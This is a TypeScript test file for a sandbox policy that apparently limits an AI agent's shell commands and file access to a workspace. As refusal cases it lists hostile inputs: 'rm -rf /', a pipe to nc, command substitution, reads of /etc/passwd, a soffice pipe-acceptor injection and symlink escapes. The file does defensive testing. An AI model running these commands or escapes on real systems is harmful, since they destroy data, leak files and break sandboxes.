/**
 * Track J: the policy seam (track O's interface) and its local implementation - default
 * deny for shell commands that cannot be parsed safely, a program allowlist, and
 * workspace scoping through symlinks.
 */
import {
  linkSync,
  mkdirSync,
  mkdtempSync,
  realpathSync,
  rmSync,
  symlinkSync,
  writeFileSync,
} from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { afterEach, beforeEach, describe, expect, it } from "vitest";
import {
  parseShellCommand,
  planShellArgv,
  resolveScoped,
  type WorkspaceScope,
  workspacePolicy,
} from "../../src/actions/policy.ts";

describe("parseShellCommand: default deny", () => {
  it.each([
    ["ls", ["ls"]],
    ["ls -l doc", ["ls", "-l", "doc"]],
    ["cat  'my file.csv'", ["cat", "my file.csv"]],
    ['sha256sum "doc/doc.xlsx"', ["sha256sum", "doc/doc.xlsx"]],
    ["head -n 5 scratch/x.csv", ["head", "-n", "5", "scratch/x.csv"]],
  ])("parses %j", (command, argv) => {
    expect(parseShellCommand(command)).toEqual({ ok: true, argv });
  });

  it.each([
    "",
    "   ",
    "cat doc | nc host 1",
    "cat doc; rm -rf /",
    "cat doc && id",
    "cat doc || id",
    "cat $HOME/x",
    "cat `id`",
    "cat $(id)",
    "cat doc > /tmp/x",
    "cat < /etc/passwd",
    "cat *",
    "cat doc?",
    "cat ~/x",
    "cat {a,b}",
    "cat doc &",
    "cat doc\nid",
    "cat doc\rid",
    "cat doc\tid",
    "cat 'unterminated",
    'cat "unterminated',
    "cat a'b'",
    "cat 'a'b",
    'cat "a"b',
    "cat a\\ b",
    "cat !1",
    "cat #x",
    "cat %PATH%",
    "cat ^x",
    "cat [ab]",
    "cat (x)",
    `cat ${"a".repeat(1100)}`,
    `ls ${"a ".repeat(20)}`,
    42,
    null,
  ])("refuses %j as UNPARSEABLE_COMMAND", (command) => {
    expect(parseShellCommand(command)).toEqual({ ok: false, code: "UNPARSEABLE_COMMAND" });
  });
});

describe("planShellArgv: program allowlist", () => {
  it.each([
    [["ls"], ["."], []],
    [["ls", "-la", "doc"], ["doc"], []],
    [["cat", "a", "b"], ["a", "b"], []],
    [["head", "-n", "5", "x"], ["x"], []],
    [["wc", "-l", "x"], ["x"], []],
    [["sha256sum", "x"], ["x"], []],
    [
      ["soffice", "--headless", "--convert-to", "csv", "--outdir", "scratch/o", "doc/d.xlsx"],
      ["doc/d.xlsx"],
      ["scratch/o"],
    ],
  ])("%j reads %j and writes %j", (argv, reads, writes) => {
    expect(planShellArgv(argv)).toMatchObject({ ok: true, plan: { reads, writes } });
  });

  it.each([
    [["rm", "x"], "PROGRAM_NOT_ALLOWED"],
    [["python3", "-c", "x"], "PROGRAM_NOT_ALLOWED"],
    [["sh", "-c", "ls"], "PROGRAM_NOT_ALLOWED"],
    [["/bin/cat", "x"], "PROGRAM_NOT_ALLOWED"],
    [["env", "cat", "x"], "PROGRAM_NOT_ALLOWED"],
    [["cp", "a", "b"], "PROGRAM_NOT_ALLOWED"],
    [["ln", "-s", "/", "x"], "PROGRAM_NOT_ALLOWED"],
    [["curl", "x"], "PROGRAM_NOT_ALLOWED"],
    [["cat"], "OPERAND_SHAPE"],
    [["cat", "--version"], "FLAG_NOT_ALLOWED"],
    [["ls", "-R", "/"], "FLAG_NOT_ALLOWED"],
    [["head", "-n", "x", "f"], "OPERAND_SHAPE"],
    [["head", "-n"], "OPERAND_SHAPE"],
    [["soffice", "--headless", "--convert-to", "xlsx", "--outdir", "o", "d"], "OPERAND_SHAPE"],
    [["soffice", "--headless", "macro:///Standard.Module1.Main"], "OPERAND_SHAPE"],
    // D1: an option in an operand slot is an option soffice acts on, never a path.
    [
      ["soffice", "--headless", "--convert-to", "csv", "--outdir", "o", "--accept=pipe,name=x"],
      "OPERAND_SHAPE",
    ],
    [
      ["soffice", "--headless", "--convert-to", "csv", "--outdir", "o", "--terminate_after_init"],
      "OPERAND_SHAPE",
    ],
    [["soffice", "--headless", "--convert-to", "csv", "--outdir", "-o", "d"], "OPERAND_SHAPE"],
    // Every literal of the shape is checked: one wrong token is OPERAND_SHAPE.
    [["soffice", "--headless", "--convert-to", "csv", "--accept", "o", "d"], "OPERAND_SHAPE"],
    [["soffice", "--headless", "--convert-to", "csv", "--outdir=o", "o", "d"], "OPERAND_SHAPE"],
    [["soffice", "--invisible", "--convert-to", "csv", "--outdir", "o", "d"], "OPERAND_SHAPE"],
    [["soffice", "--headless", "--print-to", "csv", "--outdir", "o", "d"], "OPERAND_SHAPE"],
    [["soffice", "--convert-to", "csv", "--outdir", "o", "d", "--headless"], "OPERAND_SHAPE"],
  ])("%j is %s", (argv, code) => {
    expect(planShellArgv(argv)).toEqual({ ok: false, code });
  });
});

describe("workspacePolicy: scoping", () => {
  let root: string;
  let ws: string;
  let scope: WorkspaceScope;
  beforeEach(() => {
    root = mkdtempSync(join(tmpdir(), "myco-policy-"));
    ws = join(root, "trials", "run-a");
    mkdirSync(join(ws, "doc"), { recursive: true });
    mkdirSync(join(ws, "scratch"));
    writeFileSync(join(ws, "doc", "doc.xlsx"), "x");
    mkdirSync(join(root, "trials", "run-b", "doc"), { recursive: true });
    writeFileSync(join(root, "trials", "run-b", "doc", "doc.xlsx"), "other");
    symlinkSync(join(root, "trials", "run-b", "doc", "doc.xlsx"), join(ws, "doc", "link.xlsx"));
    symlinkSync(join(root, "trials", "run-b"), join(ws, "scratch", "dirlink"));
    scope = { workspace: ws, document: join(ws, "doc", "doc.xlsx"), scratch: join(ws, "scratch") };
  });
  afterEach(() => rmSync(root, { recursive: true, force: true }));

  const req = (over: object) =>
    ({ route: "api", kind: "calc.set-cell", reads: [], writes: [], ...over }) as never;

  it("allows the document and scratch, and returns resolved paths", () => {
    const d = workspacePolicy(scope).check(
      req({ reads: ["doc/doc.xlsx"], writes: [scope.document, "scratch/out.csv"] }),
    );
    expect(d.allow).toBe(true);
    if (d.allow) {
      expect(d.reads[0]?.endsWith("/trials/run-a/doc/doc.xlsx")).toBe(true);
      expect(d.writes[1]?.endsWith("/trials/run-a/scratch/out.csv")).toBe(true);
    }
  });

  it.each([
    ["a .. escape", { reads: ["../run-b/doc/doc.xlsx"] }],
    ["an absolute host path", { reads: ["/etc/passwd"] }],
    ["another trial's document", { writes: ["../run-b/doc/doc.xlsx"] }],
    ["another trial's document, absolute", { writes: ["ABS_OTHER"] }],
    ["a symlink to another trial", { reads: ["doc/link.xlsx"] }],
    ["a path under a directory symlink", { reads: ["scratch/dirlink/doc/doc.xlsx"] }],
    ["a write through a directory symlink", { writes: ["scratch/dirlink/new.csv"] }],
    ["a path whose parent does not exist", { writes: ["nope/deeper/x"] }],
    ["an empty path", { reads: [""] }],
  ])("denies %s", (_what, over) => {
    const fix = (list?: string[]) =>
      list?.map((p) => (p === "ABS_OTHER" ? join(root, "trials", "run-b", "doc", "doc.xlsx") : p));
    const o = over as { reads?: string[]; writes?: string[] };
    const fixed = {
      ...(o.reads ? { reads: fix(o.reads) } : {}),
      ...(o.writes ? { writes: fix(o.writes) } : {}),
    };
    expect(workspacePolicy(scope).check(req(fixed))).toEqual({
      allow: false,
      code: "PATH_OUTSIDE_WORKSPACE",
    });
  });

  it("denies a write to a workspace file that is neither the document nor scratch", () => {
    writeFileSync(join(ws, "notes.txt"), "n");
    expect(workspacePolicy(scope).check(req({ writes: ["notes.txt"] }))).toEqual({
      allow: false,
      code: "WRITE_NOT_ALLOWED",
    });
    expect(workspacePolicy(scope).check(req({ writes: ["."] }))).toEqual({
      allow: false,
      code: "WRITE_NOT_ALLOWED",
    });
  });

  it("script route: parses the command itself, and returns the argv to run", () => {
    const d = workspacePolicy(scope).check(
      req({ route: "script", kind: "shell.run", command: "cat doc/doc.xlsx" }),
    );
    expect(d).toMatchObject({ allow: true, argv: ["cat", "doc/doc.xlsx"] });
  });

  it.each([
    [{ command: "cat doc/doc.xlsx | sh" }, "UNPARSEABLE_COMMAND"],
    [{ command: "rm doc/doc.xlsx" }, "PROGRAM_NOT_ALLOWED"],
    [{ command: "cat ../run-b/doc/doc.xlsx" }, "PATH_OUTSIDE_WORKSPACE"],
    [{ command: "cat /etc/hostname" }, "PATH_OUTSIDE_WORKSPACE"],
    [{ command: "cat doc/link.xlsx" }, "PATH_OUTSIDE_WORKSPACE"],
    [
      { command: "soffice --headless --convert-to csv --outdir doc doc/doc.xlsx" },
      "WRITE_NOT_ALLOWED",
    ],
    [
      { command: "soffice --headless --convert-to csv --outdir /tmp doc/doc.xlsx" },
      "PATH_OUTSIDE_WORKSPACE",
    ],
    // D1, against the real policy: the verifier's acceptor-pipe repro, and any source other
    // than the trial document (another workspace file, a macro URL with no slash).
    [
      {
        command: "soffice --headless --convert-to csv --outdir scratch --accept=pipe,name=evilpipe",
      },
      "OPERAND_SHAPE",
    ],
    [
      { command: "soffice --headless --convert-to csv --outdir scratch --terminate_after_init" },
      "OPERAND_SHAPE",
    ],
    [{ command: "soffice --headless --convert-to csv --outdir scratch scratch" }, "OPERAND_SHAPE"],
    [{ command: "soffice --headless --convert-to csv --outdir scratch macro:x" }, "OPERAND_SHAPE"],
    [{ command: "ls", argv: ["ls"] }, "BAD_REQUEST"],
    [{}, "BAD_REQUEST"],
    [{ argv: [1] }, "BAD_REQUEST"],
  ])("script route %j is denied %s", (over, code) => {
    expect(
      workspacePolicy(scope).check(req({ route: "script", kind: "shell.run", ...over })),
    ).toEqual({ allow: false, code });
  });

  it("soffice runs with the resolved absolute paths, never the agent's spelling", () => {
    const d = workspacePolicy(scope).check(
      req({
        route: "script",
        kind: "shell.run",
        command: "soffice --headless --convert-to csv --outdir scratch/o ./doc/doc.xlsx",
      }),
    );
    const real = realpathSync(ws);
    expect(d).toEqual({
      allow: true,
      code: "ALLOWED",
      reads: [join(real, "doc", "doc.xlsx")],
      writes: [join(real, "scratch", "o")],
      argv: [
        "soffice",
        "--headless",
        "--convert-to",
        "csv",
        "--outdir",
        join(real, "scratch", "o"),
        join(real, "doc", "doc.xlsx"),
      ],
    });
  });

  it("a hard link to a file outside the workspace is refused (N2)", () => {
    linkSync(join(root, "trials", "run-b", "doc", "doc.xlsx"), join(ws, "scratch", "hl"));
    expect(
      workspacePolicy(scope).check(
        req({ route: "script", kind: "shell.run", command: "cat scratch/hl" }),
      ),
    ).toEqual({ allow: false, code: "PATH_OUTSIDE_WORKSPACE" });
    expect(workspacePolicy(scope).check(req({ reads: ["scratch/hl"] }))).toEqual({
      allow: false,
      code: "PATH_OUTSIDE_WORKSPACE",
    });
  });

  it("resolveScoped refuses control characters and keeps a new path's full name (N4)", () => {
    expect(resolveScoped("doc/doc.xlsx\n", ws)).toBeNull();
    expect(resolveScoped("scratch/new\tfile", ws)).toBeNull();
    expect(resolveScoped("/myco-no-such-file-71c3", ws)).toBe("/myco-no-such-file-71c3");
    expect(resolveScoped("scratch/new.csv", ws)).toBe(join(realpathSync(ws), "scratch", "new.csv"));
  });

  it("a non-script route carrying a command is malformed", () => {
    expect(workspacePolicy(scope).check(req({ command: "ls" }))).toEqual({
      allow: false,
      code: "BAD_REQUEST",
    });
    expect(workspacePolicy(scope).check(req({ route: "gui", argv: ["ls"] }))).toEqual({
      allow: false,
      code: "BAD_REQUEST",
    });
  });

  it("the argv decides what a command touches, not the caller's lists", () => {
    const d = workspacePolicy(scope).check(
      req({
        route: "script",
        kind: "shell.run",
        reads: ["doc/doc.xlsx"],
        command: "cat /etc/hostname",
      }),
    );
    expect(d).toEqual({ allow: false, code: "PATH_OUTSIDE_WORKSPACE" });
  });

  it("refuses a malformed request", () => {
    expect(workspacePolicy(scope).check(null as never)).toEqual({
      allow: false,
      code: "BAD_REQUEST",
    });
    expect(
      workspacePolicy(scope).check({ route: "api", kind: "x", reads: "doc" } as never),
    ).toEqual({ allow: false, code: "BAD_REQUEST" });
  });

  it("refuses to build a scope that is not self-consistent", () => {
    expect(() => workspacePolicy({ ...scope, workspace: "trials/run-a" })).toThrow(/absolute/);
    expect(() =>
      workspacePolicy({ ...scope, document: join(root, "trials", "run-b", "doc", "doc.xlsx") }),
    ).toThrow(/document/);
    expect(() => workspacePolicy({ ...scope, document: ws })).toThrow(/document/);
    expect(() => workspacePolicy({ ...scope, scratch: root })).toThrow(/scratch/);
    expect(() => workspacePolicy({ ...scope, scratch: ws })).toThrow(/scratch/);
  });
});
